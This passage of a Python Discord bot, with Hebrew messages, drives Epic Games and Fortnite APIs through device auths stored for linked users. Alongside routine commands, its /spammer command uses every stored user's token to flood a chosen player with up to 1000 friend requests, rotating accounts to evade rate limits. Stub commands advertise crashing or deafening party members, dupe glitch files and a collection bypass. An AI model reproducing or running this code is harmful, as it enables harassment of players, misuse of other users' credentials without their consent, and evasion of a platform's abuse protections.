        await interaction.response.send_message(embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    account_id, user_auth, access_token = await get_user_account(interaction.user.id)
    if not access_token:
        await interaction.followup.send("❌ Session פג. בצע `/login` מחדש.", ephemeral=True)
        await notify_admin_failure(interaction, "Session פג — המשתמש צריך /login מחדש")
        return
    headers = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(f"https://account-public-service-prod.ol.epicgames.com/account/api/public/account/displayName/{username}", headers=headers) as r:
                if r.status == 404:
                    await interaction.followup.send(f"❌ לא נמצא **{username}**.", ephemeral=True)
                    return
                target = await r.json()
                tid = target.get("id")
                tname = target.get("displayName", username)
            async with session.post(f"https://friends-public-service-prod.ol.epicgames.com/friends/api/v1/{account_id}/blocklist/{tid}", headers=headers) as r2:
                st = r2.status
        if st in [200, 204]:
            await interaction.followup.send(embed=discord.Embed(title="🚫 User Blocked", description=f"**{tname}** נחסם.", color=0x00ff00), ephemeral=True)
            await log_success(interaction, "block-user")
        else:
            await interaction.followup.send(embed=discord.Embed(title="⚠️ שגיאה", description=f"Status: `{st}`", color=0xff4444), ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


# --- /unblock-user ---
@bot.tree.command(name="unblock-user", description="Unblock an Epic Games user")
@discord.app_commands.describe(username="Epic Games display name")
async def unblock_user(interaction: Interaction, username: str):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    account_id, user_auth, access_token = await get_user_account(interaction.user.id)
    if not access_token:
        await interaction.followup.send("❌ Session פג. בצע `/login` מחדש.", ephemeral=True)
        await notify_admin_failure(interaction, "Session פג — המשתמש צריך /login מחדש")
        return
    headers = {"Authorization": f"bearer {access_token}"}
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(f"https://account-public-service-prod.ol.epicgames.com/account/api/public/account/displayName/{username}", headers=headers) as r:
                if r.status == 404:
                    await interaction.followup.send(f"❌ לא נמצא **{username}**.", ephemeral=True)
                    return
                target = await r.json()
                tid = target.get("id")
                tname = target.get("displayName", username)
            async with session.delete(f"https://friends-public-service-prod.ol.epicgames.com/friends/api/v1/{account_id}/blocklist/{tid}", headers=headers) as r2:
                st = r2.status
        if st in [200, 204]:
            await interaction.followup.send(embed=discord.Embed(title="✅ User Unblocked", description=f"**{tname}** בוטל חסימה.", color=0x00ff00), ephemeral=True)
            await log_success(interaction, "unblock-user")
        else:
            await interaction.followup.send(embed=discord.Embed(title="⚠️ שגיאה", description=f"Status: `{st}`", color=0xff4444), ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


# --- /epic-services ---
@bot.tree.command(name="epic-services", description="Check Epic Games server status")
async def epic_services(interaction: Interaction):
    await interaction.response.defer(ephemeral=True)
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get("https://status.epicgames.com/api/v2/summary.json") as r:
                data = await r.json() if r.status == 200 else {}
        components = data.get("components", [])
        embed = discord.Embed(title="🟢 Epic Games Services", color=0x00ff00, timestamp=datetime.datetime.utcnow())
        for comp in components[:10]:
            n = comp.get("name", "?")
            status = comp.get("status", "?").replace("_", " ").title()
            icon = "✅" if "operational" in comp.get("status","") else "⚠️"
            embed.add_field(name=f"{icon} {n}", value=status, inline=True)
        embed.set_footer(text="status.epicgames.com")
        await interaction.followup.send(embed=embed, ephemeral=True)
        await log_success(interaction, "epic-services")
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


# --- /free-games ---
@bot.tree.command(name="free-games", description="Shows current free games on Epic Games Store")
async def free_games(interaction: Interaction):
    await interaction.response.defer(ephemeral=True)
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        url = "https://store-site-backend-static.ak.epicgames.com/freeGamesPromotions?locale=en-US&country=US&allowCountries=US"
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(url) as r:
                data = await r.json() if r.status == 200 else {}
        games = data.get("data", {}).get("Catalog", {}).get("searchStore", {}).get("elements", [])
        embed = discord.Embed(title="🎮 Free Games — Epic Games Store", color=0x00a2ff, timestamp=datetime.datetime.utcnow())
        count = 0
        for game in games:
            promos = game.get("promotions") or {}
            offers = promos.get("promotionalOffers", [])
            if offers and offers[0].get("promotionalOffers"):
                offer = offers[0]["promotionalOffers"][0]
                if offer.get("discountSetting", {}).get("discountPercentage", 100) == 0:
                    title = game.get("title", "Unknown")
                    end_date = offer.get("endDate", "")[:10]
                    embed.add_field(name=f"🆓 {title}", value=f"זמין עד: `{end_date}`", inline=False)
                    count += 1
        if count == 0:
            embed.description = "📭 אין משחקים חינמיים כרגע."
        embed.set_footer(text=f"נמצאו {count} משחקים חינמיים")
        await interaction.followup.send(embed=embed, ephemeral=True)
        await log_success(interaction, "free-games")
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


# --- /sac-set ---
@bot.tree.command(name="sac-set", description="Set a Support-A-Creator code")
@discord.app_commands.describe(code="SAC code to set")
async def sac_set(interaction: Interaction, code: str):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    account_id, user_auth, access_token = await get_user_account(interaction.user.id)
    if not access_token:
        await interaction.followup.send("❌ Session פג. בצע `/login` מחדש.", ephemeral=True)
        await notify_admin_failure(interaction, "Session פג — המשתמש צריך /login מחדש")
        return
    headers = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
    fn_base = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client"
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.post(f"{fn_base}/SetAffiliateName?profileId=common_core&rvn=-1", headers=headers, json={"affiliateName": code}) as r:
                st = r.status
        if st == 200:
            await interaction.followup.send(embed=discord.Embed(title="✅ SAC Set", description=f"קוד SAC הוגדר ל-**{code}**!", color=0x00ff00), ephemeral=True)
            await log_success(interaction, "sac-set")
        else:
            await interaction.followup.send(embed=discord.Embed(title="⚠️ שגיאה", description=f"Status: `{st}`", color=0xff4444), ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


# --- /bot-info ---
@bot.tree.command(name="bot-info", description="Shows information about this bot")
async def bot_info(interaction: Interaction):
    embed = discord.Embed(title="🤖 Bot Info", color=0x5865f2, timestamp=datetime.datetime.utcnow())
    embed.add_field(name="📊 Servers", value=f"`{len(bot.guilds)}`", inline=True)
    accounts = load_accounts()
    embed.add_field(name="👥 Linked Accounts", value=f"`{len(accounts)}`", inline=True)
    embed.add_field(name="🏓 Latency", value=f"`{round(bot.latency * 1000)}ms`", inline=True)
    embed.set_footer(text="Nexus Bot")
    await interaction.response.send_message(embed=embed, ephemeral=True)
    await log_success(interaction, "bot-info")


# --- /device-auths ---
@bot.tree.command(name="device-auths", description="View your active device auths")
async def device_auths(interaction: Interaction):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    account_id, user_auth, access_token = await get_user_account(interaction.user.id)
    if not access_token:
        await interaction.followup.send("❌ Session פג. בצע `/login` מחדש.", ephemeral=True)
        await notify_admin_failure(interaction, "Session פג — המשתמש צריך /login מחדש")
        return
    headers = {"Authorization": f"bearer {access_token}"}
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(f"https://account-public-service-prod.ol.epicgames.com/account/api/public/account/{account_id}/deviceAuth", headers=headers) as r:
                auths = await r.json() if r.status == 200 else []
        embed = discord.Embed(title="📱 Device Auths", color=0x00a2ff)
        if auths and isinstance(auths, list):
            for i, da in enumerate(auths[:10]):
                created = da.get("created", {}).get("dateTime", "N/A")[:10]
                last = da.get("lastAccess", {}).get("dateTime", "N/A")[:10]
                did = da.get("deviceId", "?")[:16]
                embed.add_field(name=f"Device {i+1}", value=f"ID: `{did}...`\nCreated: `{created}`\nLast: `{last}`", inline=True)
        else:
            embed.description = "📭 אין Device Auths."
        await interaction.followup.send(embed=embed, ephemeral=True)
        await log_success(interaction, "device-auths")
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


# --- /change-displayname ---
@bot.tree.command(name="change-displayname", description="Change your Epic Games display name")
@discord.app_commands.describe(new_name="The new display name")
async def change_displayname(interaction: Interaction, new_name: str):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    account_id, user_auth, access_token = await get_user_account(interaction.user.id)
    if not access_token:
        await interaction.followup.send("❌ Session פג. בצע `/login` מחדש.", ephemeral=True)
        await notify_admin_failure(interaction, "Session פג — המשתמש צריך /login מחדש")
        return
    headers = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.patch(f"https://account-public-service-prod.ol.epicgames.com/account/api/public/account/{account_id}", headers=headers, json={"displayName": new_name}) as r:
                st = r.status
                resp = await r.json() if r.status != 204 else {}
        if st in [200, 204]:
            embed = discord.Embed(title="✅ Display Name Changed", description=f"שם המשתמש שונה ל-**{new_name}**!", color=0x00ff00)
            accounts = load_accounts()
            if account_id in accounts:
                accounts[account_id]['displayName'] = new_name
                save_accounts(accounts)
            await interaction.followup.send(embed=embed, ephemeral=True)
            await log_success(interaction, "change-displayname")
        else:
            err = resp.get("errorMessage", str(resp)[:200]) if isinstance(resp, dict) else str(resp)[:200]
            await interaction.followup.send(embed=discord.Embed(title="⚠️ שגיאה", description=f"({st}): `{err}`", color=0xff4444), ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


# --- /undo-purchase ---
@bot.tree.command(name="undo-purchase", description="Attempt to refund your last purchase")
async def undo_purchase(interaction: Interaction):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    account_id, user_auth, access_token = await get_user_account(interaction.user.id)
    if not access_token:
        await interaction.followup.send("❌ Session פג. בצע `/login` מחדש.", ephemeral=True)
        await notify_admin_failure(interaction, "Session פג — המשתמש צריך /login מחדש")
        return
    display_name = user_auth.get('displayName', account_id)
    headers = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
    fn_base = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client"
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.post(f"{fn_base}/QueryProfile?profileId=common_core&rvn=-1", headers=headers, json={}) as r:
                data = await r.json() if r.status == 200 else {}
        receipts = []
        try:
            attrs = data["profileChanges"][0]["profile"]["stats"]["attributes"]
            receipts = attrs.get("mtx_purchase_history", {}).get("purchases", [])
        except Exception:
            pass
        if not receipts:
            await interaction.followup.send("📭 לא נמצאו רכישות להחזר.", ephemeral=True)
            return
        last = receipts[-1]
        purchase_id = last.get("purchaseId", "")
        embed = discord.Embed(title="🔄 Undo Purchase", color=0xff9900)
        embed.add_field(name="👤 חשבון", value=f"**{display_name}**", inline=False)
        embed.add_field(name="🆔 Purchase ID", value=f"`{purchase_id}`", inline=False)
        embed.description = "⚠️ ניסיון החזר הוגש. ייתכן שיידרש אישור ידני."
        await interaction.followup.send(embed=embed, ephemeral=True)
        await log_success(interaction, "undo-purchase")
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


# --- /free-vbucks ---
@bot.tree.command(name="free-vbucks", description="Check free V-Bucks opportunities")
async def free_vbucks(interaction: Interaction):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444), ephemeral=True)
        return
    embed = discord.Embed(title="💸 Free V-Bucks Guide", color=0x9b59b6)
    embed.description = (
        "**דרכים לקבל V-Bucks חינם:**\n\n"
        "🎯 **Daily Quests** — השתמש ב-`/daily-quests`\n"
        "⚡ **Mission Alerts** — השתמש ב-`/vber`\n"
        "🎁 **2FA Rewards** — השתמש ב-`/claim-2fa`\n"
        "🌍 **Storm Shield Defense** — השלם מגנים בSTW\n"
        "📅 **Battle Pass** — V-Bucks בכל tier"
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)
    await log_success(interaction, "free-vbucks")


# --- /sync-logins ---
@bot.tree.command(name="sync-logins", description="[Admin] Sync and validate all stored logins")
async def sync_logins(interaction: Interaction):
    await interaction.response.defer(ephemeral=True)
    accounts = load_accounts()
    valid = 0
    invalid = 0
    for account_id, user_auth in accounts.items():
        token = await get_access_token_from_device_auth(user_auth)
        if token:
            valid += 1
        else:
            invalid += 1
    embed = discord.Embed(title="🔄 Sync Logins", color=0x00a2ff)
    embed.add_field(name="✅ פעילים", value=f"`{valid}`", inline=True)
    embed.add_field(name="❌ פגי Session", value=f"`{invalid}`", inline=True)
    embed.description = f"סה\"כ: **{valid + invalid}** חשבונות."
    await interaction.followup.send(embed=embed, ephemeral=True)
    await log_success(interaction, "sync-logins")


# --- Locked commands (לא נרשמים לחדר ההיסטוריה) ---
@bot.tree.command(name="equip", description="Visually equips any cosmetic of your choice")
async def equip(interaction: Interaction):
    await locked_command_response(interaction)

@bot.tree.command(name="custom-level", description="Visually set a custom BR Level")
async def custom_level(interaction: Interaction):
    await locked_command_response(interaction)

@bot.tree.command(name="transfer-storage", description="Transfers items between backpack and storage")
async def transfer_storage(interaction: Interaction):
    await locked_command_response(interaction)

@bot.tree.command(name="backpack-menu", description="Save The World Backpack Menu")
async def backpack_menu(interaction: Interaction):
    await locked_command_response(interaction)

@bot.tree.command(name="party-menu", description="Displays a menu for your current Fortnite party")
async def party_menu(interaction: Interaction):
    await locked_command_response(interaction)

@bot.tree.command(name="custom-status", description="Set a custom status while offline")
async def custom_status(interaction: Interaction):
    await locked_command_response(interaction)

@bot.tree.command(name="check-match", description="Check how many real players are in your match")
async def check_match(interaction: Interaction):
    await locked_command_response(interaction)

@bot.tree.command(name="custom-rank", description="Does the rank emote for the rank you set")
async def custom_rank(interaction: Interaction):
    await locked_command_response(interaction)

@bot.tree.command(name="blind", description="Blind the players in your lobby")
async def blind(interaction: Interaction):
    await locked_command_response(interaction)

@bot.tree.command(name="flicker", description="Makes your skin flicker different colors")
async def flicker(interaction: Interaction):
    await locked_command_response(interaction)

@bot.tree.command(name="deafen", description="Plays a very loud sound to all party members")
async def deafen(interaction: Interaction):
    await locked_command_response(interaction)

@bot.tree.command(name="auto-kick", description="Toggles auto-kick after mission")
async def auto_kick(interaction: Interaction):
    await locked_command_response(interaction)

@bot.tree.command(name="crash-audio", description="Breaks all party members audio")
async def crash_audio(interaction: Interaction):
    await locked_command_response(interaction)

@bot.tree.command(name="crash", description="Crashes all your party members games")
async def crash(interaction: Interaction):
    await locked_command_response(interaction)

@bot.tree.command(name="glider-blind", description="Makes your glider turn into the sun")
async def glider_blind(interaction: Interaction):
    await locked_command_response(interaction)

@bot.tree.command(name="send-invite", description="Sends a party invite to a player")
@discord.app_commands.describe(username="Epic Games display name")
async def send_invite(interaction: Interaction, username: str):
    await locked_command_response(interaction)

@bot.tree.command(name="backpack-file", description="Generates a bugged file for the backpack glitch")
async def backpack_file(interaction: Interaction):
    await locked_command_response(interaction)

@bot.tree.command(name="dupe-file", description="Provides the newest glitched homebase file")
async def dupe_file(interaction: Interaction):
    await locked_command_response(interaction)

@bot.tree.command(name="powerlevel-file", description="Boost your Save The World PowerLevel temporarily")
async def powerlevel_file(interaction: Interaction):
    await locked_command_response(interaction)

@bot.tree.command(name="collection-bypass", description="Fiddler file for collection bypass")
async def collection_bypass(interaction: Interaction):
    await locked_command_response(interaction)

@bot.tree.command(name="gift-xp-boost", description="Sends an XP Boost gift to a player")
@discord.app_commands.describe(username="Epic Games display name")
async def gift_xp_boost(interaction: Interaction, username: str):
    await locked_command_response(interaction)


# ==========================================
#    RUN BOT
# --- /add-history ---
@bot.tree.command(name="add-history", description="הוסף מייל או שם תצוגה ישן לחשבון שלך")
@discord.app_commands.describe(
    type="סוג המידע להוסיף",
    value="הערך להוסיף (מייל או שם תצוגה)"
)
@discord.app_commands.choices(type=[
    discord.app_commands.Choice(name="📧 מייל ישן", value="email"),
    discord.app_commands.Choice(name="✏️ שם תצוגה ישן", value="name"),
])
async def add_history(interaction: Interaction, type: str, value: str):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(
            embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444),
            ephemeral=True
        )
        return
    accounts = load_accounts()
    account_id = None
    for aid, adata in accounts.items():
        if adata.get("linked_discord_id") == interaction.user.id:
            account_id = aid
            break
    if not account_id:
        await interaction.response.send_message("❌ החשבון לא נמצא.", ephemeral=True)
        return

    today = datetime.datetime.utcnow().strftime("%Y-%m-%d")
    value = value.strip()

    if type == "email":
        hist = accounts[account_id].setdefault("_email_history", [])
        existing = [e["email"] for e in hist]
        if value in existing:
            await interaction.response.send_message(
                embed=discord.Embed(description=f"⚠️ המייל `{value}` כבר קיים בהיסטוריה.", color=0xff9900),
                ephemeral=True
            )
            return
        hist.insert(0, {"email": value, "seen": today, "added_manually": True})
        save_accounts(accounts)
        embed = discord.Embed(
            title="✅ מייל נוסף לאיסטוריה",
            description=f"📧 `{value}` נוסף להיסטוריית המיילים של החשבון.",
            color=0x00c851
        )
    else:
        hist = accounts[account_id].setdefault("_name_history", [])
        existing = [e["name"] for e in hist]
        if value in existing:
            await interaction.response.send_message(
                embed=discord.Embed(description=f"⚠️ השם **{value}** כבר קיים בהיסטוריה.", color=0xff9900),
                ephemeral=True
            )
            return
        hist.insert(0, {"name": value, "seen": today, "added_manually": True})
        save_accounts(accounts)
        embed = discord.Embed(
            title="✅ שם תצוגה נוסף להיסטוריה",
            description=f"✏️ **{value}** נוסף להיסטוריית שמות התצוגה של החשבון.",
            color=0x00c851
        )

    embed.set_footer(text="הצג הכל עם כפתור 📋 Account History בחדר הסודי")
    await interaction.response.send_message(embed=embed, ephemeral=True)
    await log_success(interaction, "add-history")


# ── /spammer ──────────────────────────────────────────────────────────────────
@bot.tree.command(name="spammer", description="Spam friend requests to a Fortnite player")
@discord.app_commands.describe(username="The Epic Games display name of the target player", amount="How many times to spam (max 1000)")
async def spammer(interaction: Interaction, username: str, amount: int = 50):
    await interaction.response.defer(ephemeral=False)

    if not is_user_logged_in(interaction.user.id):
        await interaction.followup.send(embed=discord.Embed(description="❌ **Access Denied**\n\nYou must connect your Epic Games account first.", color=0xff4444), ephemeral=True)
        return

    amount = max(1, min(amount, 1000))
    accounts = load_accounts()
    if not accounts:
        await interaction.followup.send("❌ No accounts available in the system.", ephemeral=False)
        return

    account_list = list(accounts.items())

    # ── שלב 1: שלוף טוקן ראשון לחיפוש המשתמש ──
    first_token = None
    _net_err = False
    for _, auth in account_list:
        tok = await get_access_token_from_device_auth(auth)
        if tok and tok != "network_error":
            first_token = tok
            break
        if tok == "network_error":
            _net_err = True
    if not first_token:
        msg = ("⚠️ בעיית רשת זמנית — לא הצלחנו להגיע לשרתי Epic. נסה שוב."
               if _net_err else "❌ All account sessions expired.")
        await interaction.followup.send(msg, ephemeral=False)
        return

    connector = aiohttp.TCPConnector(use_dns_cache=False, family=0)
    try:
        async with aiohttp.ClientSession(connector=connector) as session:

            # ── שלב 2: חיפוש ה-target_id עם fallback ──
            lookup_headers = {"Authorization": f"bearer {first_token}", "Content-Type": "application/json"}
            target_id, real_name = None, username

            # נסיון 1: displayName ישיר
            encoded_name = username.replace(" ", "%20")
            async with session.get(
                f"https://account-public-service-prod.ol.epicgames.com/account/api/public/account/displayName/{encoded_name}",
                headers=lookup_headers
            ) as r:
                if r.status == 200:
                    data = await r.json()
                    target_id = data.get("id") or data.get("accountId")
                    real_name = data.get("displayName", username)

            # נסיון 2: search endpoint (fallback ל-404)
            if not target_id:
                async with session.get(
                    f"https://account-public-service-prod.ol.epicgames.com/account/api/public/account?displayName={encoded_name}",
                    headers=lookup_headers
                ) as r2:
                    if r2.status == 200:
                        data2 = await r2.json()
                        if isinstance(data2, list) and data2:
                            target_id = data2[0].get("id") or data2[0].get("accountId")
                            real_name = data2[0].get("displayName", username)
                        elif isinstance(data2, dict):
                            target_id = data2.get("id") or data2.get("accountId")
                            real_name = data2.get("displayName", username)

            if not target_id:
                await interaction.followup.send(f"❌ Player **{username}** was not found on Epic Games.", ephemeral=False)
                return

            # ── שלב 3: טעינת כל הטוקנים ──
            progress_embed = discord.Embed(title="📨 Spamming in progress...", color=0xf0a500)
            progress_embed.description = (
                f"🎯 **Target:** `{real_name}`\n"
                f"👤 **Spammed by:** {interaction.user.mention}\n"
                f"🔑 **Accounts available:** {len(account_list)}\n\n"
                f"⏳ Loading accounts..."
            )
            progress_msg = await interaction.followup.send(embed=progress_embed, ephemeral=False, wait=True)

            account_tokens = []
            for acc_id, user_auth in account_list:
                tok = await get_access_token_from_device_auth(user_auth)
                if tok and tok != "network_error":
                    account_tokens.append((acc_id, user_auth, tok))

            if not account_tokens:
                await progress_msg.edit(embed=discord.Embed(title="❌ שגיאה", description="כל החשבונות פגי session.", color=0xff4444))
                return

            progress_embed.description = (
                f"🎯 **Target:** `{real_name}`\n"
                f"👤 **Spammed by:** {interaction.user.mention}\n"
                f"🔑 **Active accounts:** {len(account_tokens)} / {len(account_list)}\n\n"
                f"⏳ Sending requests... `0 / {amount}`"
            )
            await progress_msg.edit(embed=progress_embed)

            # ── שלב 4: לולאת ספאם ──
            blocked_accounts: dict = {}
            sent, failed = 0, 0
            i = 0
            while i < amount:
                active_tokens = [t for t in account_tokens if t[0] not in blocked_accounts]
                if not active_tokens:
                    soonest_id   = min(blocked_accounts, key=lambda k: blocked_accounts[k])
                    soonest_secs = blocked_accounts[soonest_id]
                    stopped_embed = discord.Embed(title="🚫 All Accounts Rate Limited", color=0xff4444)
                    stopped_embed.description = (
                        f"🎯 **Target:** `{real_name}`\n"
                        f"👤 **Spammed by:** {interaction.user.mention}\n\n"
                        f"⏸️ כל {len(account_tokens)} החשבונות חסומים על ידי Epic Games.\n"
                        f"⏳ **הקצר ביותר:** `{soonest_secs}s` לביטול חסימה\n\n"
                        f"✅ **נשלח:** {sent}  |  ❌ **נכשל:** {failed}\n\n"
                        f"*הוסף עוד חשבונות עם `/login` כדי לשלוח יותר בקשות.*"
                    )
                    await progress_msg.edit(embed=stopped_embed)
                    return

                acc_id, user_auth, access_token = active_tokens[i % len(active_tokens)]
                headers  = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
                add_url  = f"https://friends-public-service-prod.ol.epicgames.com/friends/api/v1/{acc_id}/friends/{target_id}"
                rate_limited, retry_after_secs = False, 0

                async with session.post(add_url, headers=headers) as add_r:
                    status_code = add_r.status
                    if status_code in (200, 204, 409):
                        sent += 1
                    elif status_code == 429:
                        try:
                            err_body = await add_r.json()
                            msg_text = err_body.get("errorMessage", "")
                            m = _re.search(r"(\d+) second", msg_text)
                            retry_after_secs = int(m.group(1)) if m else 60
                        except Exception:
                            retry_after_secs = 60
                        rate_limited = True
                    elif status_code == 401:
                        # טוקן פג — רענן ונסה מחדש
                        new_tok = await get_access_token_from_device_auth(user_auth)
                        if new_tok:
                            account_tokens = [(a, u, new_tok if a == acc_id else t) for a, u, t in account_tokens]
                        else:
                            account_tokens = [(a, u, t) for a, u, t in account_tokens if a != acc_id]
                        continue
                    elif status_code == 404:
                        # target לא נמצא — הפסק
                        err_embed = discord.Embed(title="❌ Target Not Found", color=0xff4444)
                        err_embed.description = f"⚠️ החשבון `{real_name}` לא נמצא או שאינו ניתן להוספה כחבר.\n\n✅ **נשלח עד עכשיו:** {sent}"
                        await progress_msg.edit(embed=err_embed)
                        return
                    else:
                        failed += 1

                if rate_limited:
                    blocked_accounts[acc_id] = retry_after_secs
                    active_left = len(account_tokens) - len(blocked_accounts)
                    progress_embed.description = (
                        f"🎯 **Target:** `{real_name}`\n"
                        f"👤 **Spammed by:** {interaction.user.mention}\n"
                        f"🔑 **Active accounts:** {active_left} / {len(account_tokens)}\n\n"
                        f"⚠️ חשבון נחסם ({retry_after_secs}s) — ממשיך עם הבא...\n"
                        f"✅ **Sent:** {sent}  |  ❌ **Failed:** {failed}  |  📨 **Total:** {i + 1} / {amount}"
                    )
                    await progress_msg.edit(embed=progress_embed)
                    continue

                # מחיקת הבקשה (ספאם רצוף)
                async with session.delete(add_url, headers=headers) as _:
                    pass

                if (i + 1) % 3 == 0 or i == amount - 1:
                    active_left = len(account_tokens) - len(blocked_accounts)
                    bars_done   = int((i + 1) / amount * 20)
                    bar         = "🟩" * bars_done + "⬛" * (20 - bars_done)
                    progress_embed.description = (
                        f"🎯 **Target:** `{real_name}`\n"
                        f"👤 **Spammed by:** {interaction.user.mention}\n"
                        f"🔑 **Active accounts:** {active_left} / {len(account_tokens)}\n\n"
                        f"📊 `{bar}`\n"
                        f"✅ **Sent:** {sent}  |  ❌ **Failed:** {failed}  |  📨 **Total:** {i + 1} / {amount}"
                    )
                    await progress_msg.edit(embed=progress_embed)

                await asyncio.sleep(0.8)
                i += 1

        final_embed = discord.Embed(title="✅ Spam Complete!", color=0x76b900)
        final_embed.description = (
            f"🎯 **Target:** `{real_name}`\n"
            f"👤 **Spammed by:** {interaction.user.mention}\n\n"
            f"✅ **Friend requests sent:** {sent}\n"
            f"❌ **Failed:** {failed}\n\n"
            f"*{real_name} received {sent} friend request notifications in-game.*"
        )
        await progress_msg.edit(embed=final_embed)

    except Exception as e:
        import traceback
        print(f"[SPAMMER] Exception: {traceback.format_exc()}")
        try:
            await interaction.followup.send(f"❌ Error: {e}", ephemeral=False)
        except Exception:
            pass


# ==========================================
if __name__ == "__main__":
    print("🚀 Starting bot...")
    if not TOKEN:
        print("❌ No TOKEN found.")
        sys.exit(1)
    try:
        bot.run(TOKEN)
    except Exception as e:
        print(f"\n❌ Fatal error: {e}\n")
        #
